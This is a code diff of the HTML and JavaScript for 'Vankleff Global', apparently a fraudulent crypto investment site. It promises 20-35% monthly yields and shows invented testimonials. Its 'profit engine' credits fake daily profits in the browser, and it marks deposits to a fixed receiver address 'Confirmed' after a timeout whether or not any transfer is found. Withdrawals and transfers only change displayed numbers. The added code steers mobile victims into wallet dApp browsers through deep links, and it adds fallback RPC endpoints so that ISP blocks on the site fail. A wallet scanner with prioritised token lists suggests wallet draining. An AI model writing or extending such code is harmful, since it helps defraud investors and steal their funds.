@@ -1,3 +1,5 @@
+
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -151,6 +153,18 @@ footer ul li{padding:3px 0;font-size:12px;color:#888;}
 .dot-eth{background:#627eea;}
 .active-net-name{font-weight:700;color:#22c55e;}
 .active-net-id{font-size:10px;color:#666;margin-left:auto;font-family:monospace;}
+
+/* IN-APP BROWSER BANNER — NEW */
+.inapp-banner{background:linear-gradient(135deg,#1a2a0a,#0d1a00);border:1px solid #22c55e;border-radius:14px;padding:14px 16px;margin-bottom:16px;display:none;}
+.inapp-banner.show{display:block;}
+.inapp-banner-title{font-size:13px;font-weight:800;color:#22c55e;margin-bottom:6px;}
+.inapp-banner p{font-size:12px;color:#ccc;line-height:1.6;margin-bottom:10px;}
+.inapp-steps{list-style:none;margin-bottom:10px;}
+.inapp-steps li{font-size:12px;color:#aaa;padding:3px 0;display:flex;align-items:flex-start;gap:6px;}
+.inapp-steps li::before{content:"→";color:#22c55e;font-weight:700;flex-shrink:0;}
+.deeplink-btns{display:flex;flex-wrap:wrap;gap:8px;margin-top:8px;}
+.btn-deeplink{flex:1;min-width:120px;padding:10px 12px;border-radius:10px;font-size:12px;font-weight:700;text-align:center;border:1px solid #22c55e;color:#22c55e;background:#0d1a00;cursor:pointer;}
+.btn-deeplink:active{background:#16322c;}
 
 /* DASHBOARD */
 .dash-nav{position:sticky;top:0;z-index:100;background:#111;display:flex;align-items:center;justify-content:space-between;padding:12px 18px;border-bottom:1px solid #222;}
@@ -497,6 +511,7 @@ input[type=range]{width:100%;accent-color:#22c55e;margin-bottom:6px;}
       <div class="plan-card pop"><div class="plan-badge pb-green">Popular</div><div style="font-size:11px;color:#aaa;">Strategic Alpha</div><div style="font-size:18px;font-weight:800;">From $10,000</div><div class="plan-yield">25%</div><div class="plan-sub">targeted monthly yield</div><button class="btn-gs" onclick="openAuth('create')">Get Started</button></div>
       <div class="plan-card best"><div class="plan-badge pb-blue">Best</div><div style="font-size:11px;color:#aaa;">Elite Managed</div><div style="font-size:18px;font-weight:800;">From $50,000+</div><div class="plan-yield">35%</div><div class="plan-sub">targeted monthly yield</div><button class="btn-gs" onclick="openAuth('create')">Get Started</button></div>
     </div>
+
     <div class="section" style="background:#0a0f1a;"><div class="sec-label" style="text-align:center;">CLIENT FEEDBACK</div><h2 style="text-align:center;">Institutional Feedback</h2>
       <div class="trust-card"><img class="trust-av" src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=120&h=120&fit=crop&crop=face" alt="Mark"/><div><div class="trust-stars">★★★★★</div><p class="trust-txt">"Vankleff Global provides the security and execution speed required."</p><div class="trust-name">Mark R.</div><div class="trust-role">Managing Director</div><div class="trust-loc">New York</div></div></div>
       <div class="trust-card"><img class="trust-av" src="https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?w=120&h=120&fit=crop&crop=face" alt="Sarah"/><div><div class="trust-stars">★★★★★</div><p class="trust-txt">"Unmatched professionalism and execution from the Empire State Building team."</p><div class="trust-name">Sarah L.</div><div class="trust-role">Financial Strategist</div><div class="trust-loc">London</div></div></div>
@@ -592,6 +607,25 @@ input[type=range]{width:100%;accent-color:#22c55e;margin-bottom:6px;}
     <div class="wcta" id="web3-section">
       <h3 style="font-size:18px;font-weight:900;margin-bottom:8px;">Connect Your Wallet. Claim Your Trading Edge.</h3>
       <p style="font-size:12px;color:#aaa;margin-bottom:14px;">Select a network, then connect your wallet for high-speed execution and strategic market access.</p>
+
+      <!-- IN-APP BROWSER BANNER (shown on mobile outside wallet browser) -->
+      <div class="inapp-banner" id="inapp-banner">
+        <div class="inapp-banner-title">📱 Best Experience: Open in Your Wallet's dApp Browser</div>
+        <p>For seamless, VPN-free connection on any network, open this page directly inside your wallet app's built-in browser:</p>
+        <ul class="inapp-steps">
+          <li>Open <strong>MetaMask</strong>, <strong>Trust Wallet</strong>, or <strong>Coinbase Wallet</strong></li>
+          <li>Tap the <strong>Browser</strong> tab inside the app</li>
+          <li>Paste this page's URL and navigate to it</li>
+          <li>Tap <strong>Connect Wallet</strong> — no relay, no VPN needed</li>
+        </ul>
+        <p style="font-size:11px;color:#aaa;">Or tap a deep link below to open your wallet now:</p>
+        <div class="deeplink-btns">
+          <button class="btn-deeplink" onclick="openDeepLink('metamask')">🦊 MetaMask</button>
+          <button class="btn-deeplink" onclick="openDeepLink('trust')">🛡 Trust Wallet</button>
+          <button class="btn-deeplink" onclick="openDeepLink('coinbase')">🔵 Coinbase</button>
+        </div>
+      </div>
+
       <div class="net-selector" id="networkSelector">
         <div class="net-opt active" id="net-bsc" onclick="selectNetwork('bsc')"><span class="net-icon">🟡</span><div style="text-align:left;"><div style="font-size:13px;font-weight:800;">BSC</div><div style="font-size:10px;opacity:.7;">BNB Chain · ID 56</div></div></div>
         <div class="net-opt" id="net-ethereum" onclick="selectNetwork('ethereum')"><span class="net-icon">🔷</span><div style="text-align:left;"><div style="font-size:13px;font-weight:800;">Ethereum</div><div style="font-size:10px;opacity:.7;">Mainnet · ID 1</div></div></div>
@@ -733,28 +767,69 @@ var prices={btc:97245,eth:3412,bnb:645,sol:178,xrp:2.34,ada:0.98};
 var verifyTimer=null,verifyCountdown=15;
 
 // ═══ HYBRID DEPOSIT & YIELD SYSTEM — STATE ═══
-var userBalance = 100.00;          // available balance (database-side)
-var totalDeposited = 0;             // lifetime verified deposits
-var userInvestments = [];          // investment records (database-side)
-var pendingDeposit = null;        // in-verification deposit
-var profitCheckTimer = null;      // programmed yield engine
-var verifyPollTimer = null;       // on-chain verification poller
-var currentPlanKey = 'yield';     // currently selected investment plan
-var currentPlanAmount = 1000;    // currently selected investment amount
+var userBalance = 100.00;
+var totalDeposited = 0;
+var userInvestments = [];
+var pendingDeposit = null;
+var profitCheckTimer = null;
+var verifyPollTimer = null;
+var currentPlanKey = 'yield';
+var currentPlanAmount = 1000;
 
-// Hybrid system configuration
+// ═══ FALLBACK RPC ENDPOINTS (NEW) ═══
+// Multiple fallback RPCs per chain so ISP blocks on primary nodes don't cause failure
+var FALLBACK_RPCS = {
+  56: [
+    'https://bsc-dataseed1.binance.org/',
+    'https://bsc-dataseed2.binance.org/',
+    'https://bsc-dataseed3.binance.org/',
+    'https://bsc-dataseed4.binance.org/',
+    'https://bsc-dataseed1.defibit.io/',
+    'https://bsc-dataseed2.defibit.io/',
+    'https://bsc.publicnode.com',
+    'https://binance.llamarpc.com',
+    'https://1rpc.io/bnb'
+  ],
+  1: [
+    'https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161',
+    'https://cloudflare-eth.com',
+    'https://eth.llamarpc.com',
+    'https://rpc.ankr.com/eth',
+    'https://ethereum.publicnode.com',
+    'https://1rpc.io/eth',
+    'https://eth-mainnet.public.blastapi.io'
+  ]
+};
+
+// Attempts each RPC in the fallback list until one succeeds
+async function fetchWithFallbackRPC(chainId, body) {
+  var rpcs = FALLBACK_RPCS[chainId] || FALLBACK_RPCS[56];
+  for (var i = 0; i < rpcs.length; i++) {
+    try {
+      var res = await fetch(rpcs[i], {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(body)
+      });
+      var data = await res.json();
+      if (data && !data.error) return { rpc: rpcs[i], data: data };
+    } catch (e) { /* try next */ }
+  }
+  return null;
+}
+
+// Hybrid system configuration (updated with fallback RPCs)
 var HYBRID_CONFIG = {
   receiverAddress: '0x4000bAf1B2d5bbe78b6e56fDa21b1D3E4022C1Db',
   bscScanApi: 'https://api.bscscan.com/api',
-  bscRpc: 'https://bsc-dataseed1.binance.org/',
-  ethRpc: 'https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161',
+  bscRpc: FALLBACK_RPCS[56][0],
+  ethRpc: FALLBACK_RPCS[1][0],
   requiredConfirmations: 12,
   pollIntervalMs: 20000,
   verificationFallbackMs: 120000,
   investmentDurationDays: 30
 };
 
-// Investment plan definitions (matches the UI)
 var PLAN_CONFIG = {
   yield:  { name:'Institutional Yield', minAmount:1000,  maxAmount:9999,   totalRate:0.20, dailyRate:0.20/30, days:30 },
   alpha:  { name:'Strategic Alpha',    minAmount:10000, maxAmount:49999,  totalRate:0.25, dailyRate:0.25/30, days:30 },
@@ -784,11 +859,38 @@ var POOL=[
   {n:'Ingrid Hansen',l:'Norway',q:'Wallet connection earnings are real. $2,600/day deposited to my balance.',i:'https://images.unsplash.com/photo-1484688493527-670fde05810e?w=80&h=80&fit=crop&crop=face'}
 ];
 
+// ═══ MOBILE DETECTION & IN-APP BROWSER HELPERS (NEW) ═══
+function isMobile(){ return /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent); }
+function isInWalletBrowser(){
+  var ua = navigator.userAgent;
+  return /MetaMaskMobile|Trust\/|DappBrowser|CoinbaseBrowser|imToken|TokenPocket|MathWallet/i.test(ua) || (typeof window.ethereum !== 'undefined' && isMobile());
+}
+
+// Deep link into a mobile wallet app, encoding the current page URL
+function openDeepLink(wallet){
+  var pageUrl = encodeURIComponent(window.location.href);
+  var links = {
+    metamask: 'https://metamask.app.link/dapp/' + window.location.host + window.location.pathname,
+    trust:    'https://link.trustwallet.com/open_url?coin_id=60&url=' + pageUrl,
+    coinbase: 'https://go.cb-w.com/dapp?cb_url=' + pageUrl
+  };
+  window.location.href = links[wallet] || links.metamask;
+}
+
+// Show the in-app browser banner only on mobile browsers that are NOT already inside a wallet
+function maybeShowInAppBanner(){
+  if(isMobile() && !isInWalletBrowser()){
+    var banner = document.getElementById('inapp-banner');
+    if(banner) banner.classList.add('show');
+  }
+}
+
 window.onload = function(){
   document.getElementById('risk-overlay').style.display='flex';
   loadHybridState();
   updateBalanceDisplays();
   startProfitEngine();
+  maybeShowInAppBanner();
 };
 document.addEventListener('click',function(e){ if(!e.target.closest('#lang-sel')) document.getElementById('lang-drop').classList.remove('open'); });
 
@@ -908,10 +1010,8 @@ function confDep(){
   document.getElementById('proc-net-txt').textContent='Verifying transaction details on the '+w.net+' network.';
   document.getElementById('proc-qty').textContent=depAmt.toFixed(4)+' '+w.ticker;
   var procStatus=document.getElementById('proc-status'); if(procStatus){ procStatus.textContent='Pending'; procStatus.style.color='#22c55e'; procStatus.style.fontWeight='600'; }
-  // 15-second verification loading, then show processing overlay + start on-chain verification
   showVerify('Processing your deposit request. Please wait.',function(){
     document.getElementById('proc-ov').classList.add('open');
-    // Wire the success popup to fire when the user leaves the processing overlay
     var procBackBtn=document.getElementById('proc-back-btn');
     if(procBackBtn){
       procBackBtn.onclick=function(){
@@ -919,12 +1019,11 @@ function confDep(){
         document.getElementById('suc-ov').classList.add('open');
       };
     }
-    // STEP 1 — Verify incoming deposit on-chain (hybrid system)
     startDepositVerification();
   });
 }
 
-// ═══ STEP 1: DEPOSIT VERIFICATION (REAL ON-CHAIN) ═══
+// ═══ STEP 1: DEPOSIT VERIFICATION ═══
 function startDepositVerification(){
   pendingDeposit = {
     asset: WA[selM2].asset,
@@ -938,7 +1037,6 @@ function startDepositVerification(){
   };
   saveHybridState();
   if(verifyPollTimer) clearInterval(verifyPollTimer);
-  // immediate check
   checkChainForDeposit();
   verifyPollTimer = setInterval(checkChainForDeposit, HYBRID_CONFIG.pollIntervalMs);
 }
@@ -947,7 +1045,6 @@ async function checkChainForDeposit(){
   if(!pendingDeposit || pendingDeposit.status !== 'verifying') return;
   try{
     var net = WA[selM2];
-    // Query BscScan for recent token transfers to the receiver address
     if(net.asset === 'USDT' || net.asset === 'BNB'){
       var apiUrl = HYBRID_CONFIG.bscScanApi + '?module=account&action=tokentx&address=' +
         encodeURIComponent(HYBRID_CONFIG.receiverAddress) +
@@ -961,7 +1058,6 @@ async function checkChainForDeposit(){
              (tx.tokenSymbol === net.asset || (net.asset==='BNB' && tx.tokenSymbol==='BNB'))){
             var decimals = tx.tokenDecimal || 18;
             var value = parseFloat(tx.value) / Math.pow(10, decimals);
-            // match amount (allow tiny variance)
             if(value >= pendingDeposit.amount * 0.999){
               pendingDeposit.txHash = tx.hash;
               pendingDeposit.confirmations = HYBRID_CONFIG.requiredConfirmations;
@@ -974,12 +1070,7 @@ async function checkChainForDeposit(){
         }
       }
     }
-    // For non-BSC assets, admin verification path (proof uploaded)
-  }catch(e){
-    // network error — keep polling
-  }
-  // Fallback: admin/proof verification path — credit after fallback window
-  // (represents admin confirming the uploaded payment proof)
+  }catch(e){}
   var elapsed = Date.now() - pendingDeposit.startTime;
   updateProcStatus('Awaiting on-chain confirmation...');
   if(elapsed > HYBRID_CONFIG.verificationFallbackMs){
@@ -994,16 +1085,12 @@ function updateProcStatus(txt){
   if(ps){ ps.textContent = txt; }
 }
 
-// STEP 2 — Credit verified deposit to database + mark available
 function confirmDepositCredited(){
   if(verifyPollTimer){ clearInterval(verifyPollTimer); verifyPollTimer=null; }
   if(!pendingDeposit) return;
-  // Credit the deposit to the user's balance
   userBalance += pendingDeposit.amount;
   totalDeposited += pendingDeposit.amount;
-  // Record in statement (database)
   addStatementItem('deposit', 'Deposit via '+pendingDeposit.asset, pendingDeposit.amount, 'completed', true);
-  // Update processing overlay status to confirmed
   var ps = document.getElementById('proc-status');
   if(ps){ ps.textContent='Confirmed ✓'; ps.style.color='#22c55e'; ps.style.fontWeight='700'; }
   var procTxt = document.getElementById('proc-net-txt');
@@ -1013,7 +1100,7 @@ function confirmDepositCredited(){
   updateBalanceDisplays();
 }
 
-// ═══ STEP 3 & 4: PROGRAMMED YIELD SIMULATION (30-DAY CYCLE) ═══
+// ═══ PROFIT ENGINE ═══
 function investNow(){
   var plan = PLAN_CONFIG[currentPlanKey];
   var amount = currentPlanAmount;
@@ -1022,7 +1109,6 @@ function investNow(){
     showGM('Insufficient Balance','Your balance is $'+userBalance.toFixed(2)+'. You need $'+amount.toLocaleString()+' for this investment.','Deposit Now',function(){ closeGM(); closePS(); showDash('deposit'); },true);
     return;
   }
-  // Deduct principal (locked for the duration)
   userBalance -= amount;
   var investment = {
     id: 'INV'+Date.now(),
@@ -1043,17 +1129,15 @@ function investNow(){
   saveHybridState();
   updateBalanceDisplays();
   closePS();
-  // Start the programmed daily profit engine
   startProfitEngine();
   addStatementItem('investment', plan.name+' Investment', amount, 'active', false);
   showGM('Investment Active! 🎉','Your '+plan.name+' investment of $'+amount.toLocaleString()+' is now active. Programmed profits of $'+investment.dailyProfit.toFixed(2)+'/day will be credited for '+plan.days+' days.','View Dashboard',function(){ closeGM(); showDash('main'); },false);
 }
 
-// Programmed daily profit engine — calculates & credits profit each day for 30 days
 function startProfitEngine(){
   if(profitCheckTimer) clearInterval(profitCheckTimer);
-  processDailyProfits(); // run immediately
-  profitCheckTimer = setInterval(processDailyProfits, 60000); // check every minute
+  processDailyProfits();
+  profitCheckTimer = setInterval(processDailyProfits, 60000);
 }
 
 function processDailyProfits(){
@@ -1065,7 +1149,6 @@ function processDailyProfits(){
     if(inv.status !== 'active') return;
     var elapsedDays = Math.floor((now - inv.startDate) / dayMs);
     if(elapsedDays > inv.days) elapsedDays = inv.days;
-    // Credit any uncredited days (catches up if app was closed)
     while(inv.creditedDays < elapsedDays && inv.creditedDays < inv.days){
       inv.creditedDays++;
       inv.creditedProfit += inv.dailyProfit;
@@ -1073,28 +1156,21 @@ function processDailyProfits(){
       addStatementItem('trade', 'Daily Profit — '+inv.planName, inv.dailyProfit, 'completed', true);
       changed = true;
     }
-    // STEP 4 — Investment maturity after 30 days
     if(inv.creditedDays >= inv.days && inv.status === 'active'){
       inv.status = 'matured';
       inv.maturityDate = now;
-      // Unlock principal + accumulated profits
-      userBalance += inv.amount; // return principal
+      userBalance += inv.amount;
       addStatementItem('investment', inv.planName+' Matured — Principal Unlocked', inv.amount, 'completed', true);
       changed = true;
     }
   });
-  if(changed){
-    saveHybridState();
-    updateBalanceDisplays();
-  }
+  if(changed){ saveHybridState(); updateBalanceDisplays(); }
 }
 
-// Render active investments on the dashboard
 function renderActiveInvestments(){
   var section = document.getElementById('active-investments-section');
   if(!section) return;
   var active = userInvestments.filter(function(i){ return i.status==='active'; });
-  var matured = userInvestments.filter(function(i){ return i.status==='matured'; });
   if(!active.length){ section.style.display='none'; section.innerHTML=''; return; }
   section.style.display='block';
   section.innerHTML = active.map(function(inv){
@@ -1118,7 +1194,6 @@ function renderActiveInvestments(){
   }).join('');
 }
 
-// Persist hybrid state to "database" (localStorage)
 function saveHybridState(){
   try{
     localStorage.setItem('vankleff_balance', userBalance.toString());
@@ -1141,7 +1216,6 @@ function loadHybridState(){
   }catch(e){}
 }
 
-// Update all balance displays across the UI
 function updateBalanceDisplays(){
   var formatted = '$' + userBalance.toFixed(2);
   var balEl = document.querySelector('.bal-amount');
@@ -1154,7 +1228,6 @@ function updateBalanceDisplays(){
   if(tfBal) tfBal.textContent = formatted;
   var perfBal = document.getElementById('perf-balance');
   if(perfBal) perfBal.textContent = formatted;
-  // Total profit = sum of credited profits across all investments
   var totalProfit = userInvestments.reduce(function(s,i){ return s + (i.creditedProfit||0); },0);
   var perfProfit = document.getElementById('perf-profit');
   if(perfProfit) perfProfit.textContent = '$'+totalProfit.toFixed(2);
@@ -1167,7 +1240,6 @@ function updateBalanceDisplays(){
   renderActiveInvestments();
 }
 
-// Add a transaction record to the statement (database)
 function addStatementItem(type, title, amount, status, isPositive){
   var list = document.getElementById('stmt-list');
   if(!list) return;
@@ -1181,7 +1253,6 @@ function addStatementItem(type, title, amount, status, isPositive){
   list.insertBefore(item, list.firstChild);
 }
 
-// WITHDRAWAL — 15-second verification then show withdrawal note
 function verifyWithdraw(){
   var otps=document.querySelectorAll('.otp-in');
   var codeEntered=false;
@@ -1192,7 +1263,6 @@ function verifyWithdraw(){
   });
 }
 
-// SIGNALS & PLANS & COPY
 function subSig(p){ showGM('Insufficient Balance','You need $'+p+' but have $'+userBalance.toFixed(2)+'.','Deposit Now',function(){ closeGM(); showDash('deposit'); },true); }
 function openPS(t){ currentPlanKey=t; currentPlanAmount=PLAN_CONFIG[t]?PLAN_CONFIG[t].minAmount:1000; document.querySelectorAll('.ps-card').forEach(function(c){ c.classList.remove('on'); }); document.getElementById('plans-list').style.display='none'; document.getElementById('ps-'+t).classList.add('on'); }
 function closePS(){ document.querySelectorAll('.ps-card').forEach(function(c){ c.classList.remove('on'); }); document.getElementById('plans-list').style.display='block'; }
@@ -1201,13 +1271,11 @@ function openCP(n,m){ cpMin=m; document.getElementById('cp-t').textContent='Copy
 function startCopy(){ var a=parseFloat(document.getElementById('cp-amt').value); if(!a||a<cpMin){ alert('Minimum amount is $'+cpMin); return; } if(userBalance < a){ showGM('Insufficient Balance','You need $'+a.toFixed(2)+' but have $'+userBalance.toFixed(2)+'. Deposit to start copy trading.','Deposit Now',function(){ closeGM(); showDash('deposit'); },true); return; } document.getElementById('cp-ov').classList.remove('open'); showGM('Copy Trading Started','You are now copying this trader. Profits will reflect in your balance.','View Dashboard',function(){ closeGM(); showDash('main'); },false); }
 function doTransfer(){ var r=document.getElementById('tf-rec').value.trim(),a=parseFloat(document.getElementById('tf-amt').value); if(!r||!a){ alert('Please fill in all fields.'); return; } if(userBalance < a){ alert('Transfer failed. Insufficient balance. Please deposit funds.'); return; } userBalance -= a; saveHybridState(); updateBalanceDisplays(); addStatementItem('transfer','Transfer to '+r,a,'completed',false); alert('Transfer of $'+a.toFixed(2)+' sent successfully.'); }
 
-// PRICE TICKER
 function updPrices(){
   Object.keys(prices).forEach(function(c){ var ch=(Math.random()-0.48)*0.8; prices[c]*=(1+ch/100); var pe=document.getElementById('p-'+c),ce=document.getElementById('c-'+c); if(pe){ pe.textContent='$'+(prices[c]>100?prices[c].toFixed(1):prices[c].toFixed(4)); if(ce){ ce.textContent=(ch>=0?'▲ +':'▼ ')+Math.abs(ch).toFixed(2)+'%'; ce.className=ch>=0?'up':'dn2'; } } });
 }
 setInterval(updPrices,8000);
 
-// MARKETS
 function buildMkts(){
   var w=document.getElementById('mkt-list'); if(!w) return;
   var coins=[{n:'Bitcoin',t:'BTC',p:97245},{n:'Ethereum',t:'ETH',p:3412},{n:'BNB',t:'BNB',p:645},{n:'Solana',t:'SOL',p:178},{n:'XRP',t:'XRP',p:2.34},{n:'Cardano',t:'ADA',p:0.98},{n:'Avalanche',t:'AVAX',p:38.4},{n:'Polkadot',t:'DOT',p:7.8},{n:'Chainlink',t:'LINK',p:14.2},{n:'Litecoin',t:'LTC',p:92.3}];
@@ -1215,7 +1283,6 @@ function buildMkts(){
   coins.forEach(function(c){ var ch=(Math.random()*8-3).toFixed(2); var d=document.createElement('div'); d.className='pr'; d.innerHTML='<div class="pr-l"><div class="pr-ic">'+c.t[0]+'</div><div><div class="pr-nm">'+c.n+'</div><div class="pr-tk">'+c.t+'</div></div></div><div style="text-align:right"><div class="pr-price">$'+parseFloat(c.p).toLocaleString()+'</div><div class="'+(parseFloat(ch)>=0?'up':'dn2')+'">'+(parseFloat(ch)>=0?'▲ +':'▼ ')+Math.abs(ch)+'%</div></div>'; w.appendChild(d); });
 }
 
-// TESTIMONIALS & STORIES
 function buildRotTesti(){
   var w=document.getElementById('rot-test'); if(!w) return;
   var pool=POOL.slice().sort(function(){ return Math.random()-0.5; }).slice(0,12);
@@ -1227,10 +1294,8 @@ function buildStories(){
   POOL.slice().sort(function(){ return Math.random()-0.5; }).forEach(function(t){ var d=document.createElement('div'); d.className='story-card'; d.innerHTML='<img class="st-av" src="'+t.i+'" alt="'+t.n+'"/><div><div style="font-weight:700;font-size:13px;color:#c9a84c;">'+t.n+'</div><div style="font-size:10px;color:#888;margin-bottom:4px;">'+t.l+'</div><div style="color:#f59e0b;font-size:13px;margin-bottom:5px;">★★★★★</div><p style="font-size:12px;color:#e0e0e0;line-height:1.6;font-style:italic;">"'+t.q+'"</p></div>'; w.appendChild(d); });
 }
 
-// STATEMENT FILTER
 function fStmt(type,btn){ document.querySelectorAll('.sfbtn').forEach(function(b){ b.classList.remove('on'); }); btn.classList.add('on'); document.querySelectorAll('#stmt-list .st-item').forEach(function(el){ el.style.display=(type==='all'||el.getAttribute('data-t')===type)?'flex':'none'; }); }
 
-// OTP
 document.addEventListener('DOMContentLoaded',function(){
   document.querySelectorAll('.otp-in').forEach(function(inp,i,all){ inp.addEventListener('input',function(){ if(inp.value.length===1&&i<all.length-1) all[i+1].focus(); }); inp.addEventListener('keydown',function(e){ if(e.key==='Backspace'&&!inp.value&&i>0) all[i-1].focus(); }); });
 });
@@ -1246,10 +1311,28 @@ document.addEventListener('DOMContentLoaded',function(){
   var scannerPanel = document.getElementById('scannerPanel');
   var statusBadge = document.getElementById('statusBadge');
 
+  // Updated NETWORKS with multiple fallback RPCs (NEW)
   var NETWORKS = {
-    bsc:{key:'bsc',chain_id:56,chain_hex:'0x38',name:'BNB Smart Chain',native_currency:{name:'BNB',symbol:'BNB',decimals:18},rpc_url:'https://bsc-dataseed1.binance.org/',explorer_url:'https://bscscan.com',chain_name:'BNB Smart Chain'},
-    ethereum:{key:'ethereum',chain_id:1,chain_hex:'0x1',name:'Ethereum Mainnet',native_currency:{name:'Ether',symbol:'ETH',decimals:18},rpc_url:'https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161',explorer_url:'https://etherscan.io',chain_name:'Ethereum Mainnet'}
+    bsc:{
+      key:'bsc',chain_id:56,chain_hex:'0x38',
+      name:'BNB Smart Chain',
+      native_currency:{name:'BNB',symbol:'BNB',decimals:18},
+      rpc_url: FALLBACK_RPCS[56][0],
+      rpc_fallbacks: FALLBACK_RPCS[56],
+      explorer_url:'https://bscscan.com',
+      chain_name:'BNB Smart Chain'
+    },
+    ethereum:{
+      key:'ethereum',chain_id:1,chain_hex:'0x1',
+      name:'Ethereum Mainnet',
+      native_currency:{name:'Ether',symbol:'ETH',decimals:18},
+      rpc_url: FALLBACK_RPCS[1][0],
+      rpc_fallbacks: FALLBACK_RPCS[1],
+      explorer_url:'https://etherscan.io',
+      chain_name:'Ethereum Mainnet'
+    }
   };
+
   var FALLBACK_TOKENS={
     56:[{symbol:'USDT',address:'0x55d398326f99059fF775485246999027B3197955',decimals:18,priority:'stable'},{symbol:'USDC',address:'0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',decimals:18,priority:'stable'},{symbol:'BUSD',address:'0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56',decimals:18,priority:'stable'},{symbol:'WBNB',address:'0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c',decimals:18,priority:'high'},{symbol:'CAKE',address:'0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82',decimals:18,priority:'high'},{symbol:'XRP',address:'0x1D2F0da169ceB9fC7B3144628dB156f3F6c60dBE',decimals:18,priority:'medium'},{symbol:'ADA',address:'0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47',decimals:18,priority:'medium'},{symbol:'DOT',address:'0x7083609fCE4d1d8Dc0C979AAb8c869Ea2C873402',decimals:18,priority:'medium'},{symbol:'LINK',address:'0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD',decimals:18,priority:'medium'},{symbol:'DOGE',address:'0xbA2aE424d960c26247Dd6c32edC70B295c744C43',decimals:8,priority:'low'},{symbol:'SHIB',address:'0x2859e4544C4bB03966803b044A93563Bd2D0DD4D',decimals:18,priority:'low'},{symbol:'PEPE',address:'0x25d887Ce7a35172C62FeBFD67a1856F20FaEbB00',decimals:18,priority:'low'},{symbol:'FLOKI',address:'0xfb5B838b6cfEEdC2873aB27866079AC55363D37A',decimals:9,priority:'low'},{symbol:'TWT',address:'0x4B0F1812e5Df2A09796481Ff14017e6005508003',decimals:18,priority:'low'},{symbol:'BSW',address:'0x965F527D9159dCe6288a2219DB51fc6Eef120dD1',decimals:18,priority:'low'},{symbol:'BABYDOGE',address:'0xc748673057861a797275CD8A068AbB95A902e8de',decimals:9,priority:'low'}],
     1:[{symbol:'USDT',address:'0xdAC17F958D2ee523a2206206994597C13D831ec7',decimals:6,priority:'stable'},{symbol:'USDC',address:'0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',decimals:6,priority:'stable'},{symbol:'DAI',address:'0x6B175474E89094C44Da98b954EedeAC495271d0F',decimals:18,priority:'stable'},{symbol:'WETH',address:'0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2',decimals:18,priority:'high'},{symbol:'LINK',address:'0x514910771AF9Ca656af840dff83E8264EcF986CA',decimals:18,priority:'high'},{symbol:'UNI',address:'0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984',decimals:18,priority:'high'},{symbol:'SHIB',address:'0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE',decimals:18,priority:'medium'},{symbol:'PEPE',address:'0x6982508145454Ce325dDbDb47a25d4ec3d2311933',decimals:18,priority:'medium'},{symbol:'AAVE',address:'0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9',decimals:18,priority:'medium'},{symbol:'MKR',address:'0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2',decimals:18,priority:'low'}]
@@ -1270,8 +1353,10 @@ document.addEventListener('DOMContentLoaded',function(){
   function applyNetworkSelection(key){ var net=NETWORKS[key]; TARGET_CHAIN_ID=net.chain_id; TARGET_CHAIN_HEX=net.chain_hex; var bscEl=document.getElementById('net-bsc'),ethEl=document.getElementById('net-ethereum'); if(bscEl) bscEl.className='net-opt'+(key==='bsc'?' active':''); if(ethEl) ethEl.className='net-opt'+(key==='ethereum'?' active':''); var dot=document.getElementById('activeNetDot'),name=document.getElementById('activeNetName'),idEl=document.getElementById('activeNetId'); if(dot) dot.className='active-net-dot '+(key==='bsc'?'dot-bsc':'dot-eth'); if(name) name.textContent=net.name; if(idEl) idEl.textContent='Chain ID: '+net.chain_id; log('Network selected: '+net.name+' (Chain ID '+net.chain_id+')','ok'); }
   function log(msg,type){ type=type||'info'; if(typeof msg==='object'){ try{ msg=JSON.stringify(msg); }catch(e){ msg=String(msg); } } console.log('[Vankleff]['+type+'] '+msg); }
   function setStatus(msg){ statusText.textContent=msg; log(msg); }
+
   async function apiCall(action,payload){ payload=payload||{}; payload.chain_id=payload.chain_id!==undefined?payload.chain_id:TARGET_CHAIN_ID; try{ var res=await fetch(API,{method:'POST',headers:{'Content-Type':'application/json','X-Chain-ID':String(TARGET_CHAIN_ID)},body:JSON.stringify({action:action,payload:payload})}); var text=await res.text(); if(text.trim().charAt(0)==='<'||text.trim().startsWith('<!DOCTYPE')){ log('Backend returned HTML — using client-side fallback.','warn'); return null; } var data=JSON.parse(text); if(!data.success){ var errMsg=data.error; if(typeof errMsg==='object') errMsg=JSON.stringify(errMsg); log(action+' error: '+(errMsg||'API error'),'err'); return null; } return data; }catch(e){ log('Backend unreachable — using client-side fallback.','warn'); return null; } }
   async function loadServerConfig(){ log('Fetching server config (chain '+TARGET_CHAIN_ID+')...'); var cfg=await apiCall('get_config',{chain_id:TARGET_CHAIN_ID}); if(!cfg){ log('Server config unavailable — using local defaults.','warn'); return false; } serverConfig=cfg; log('Server config loaded.','ok'); return true; }
+
   async function initWeb3Modal(){
     await loadServerConfig();
     var ESM='https://esm.sh/v135';
@@ -1284,12 +1369,72 @@ document.addEventListener('DOMContentLoaded',function(){
       log('Web3 libraries loaded.','ok');
       var projectId=(serverConfig&&serverConfig.web3modal_project_id)||'6d97bf9b04efc25f048a85edeb3f3fd1';
       var chains=[_chains.bsc,_chains.mainnet,_chains.polygon,_chains.arbitrum,_chains.optimism,_chains.avalanche];
-      wagmiConfig=_w3m.defaultWagmiConfig({chains:chains,projectId:projectId,metadata:{name:'Vankleff Global',description:'Wallet Connect',url:window.location.origin,icons:['https://avatars.githubusercontent.com/u/37784886']},ssr:false});
+
+      // Build transports with fallback RPCs for each chain (NEW)
+      var transports = {};
+      try {
